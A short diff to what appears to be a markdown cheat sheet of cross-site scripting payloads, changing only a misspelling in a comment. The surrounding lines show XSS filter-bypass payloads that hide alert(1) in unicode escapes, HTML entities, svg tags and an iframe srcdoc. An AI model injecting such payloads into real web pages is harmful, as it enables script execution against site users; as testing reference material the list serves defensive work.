@@ -297,7 +297,7 @@ loop``````````````
 ```javascript
 <script>\u0061lert(1)</script>
 <svg><script>alert&lpar;'1'&rpar;
-<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
+<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are necessary
 <iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
 
 ```
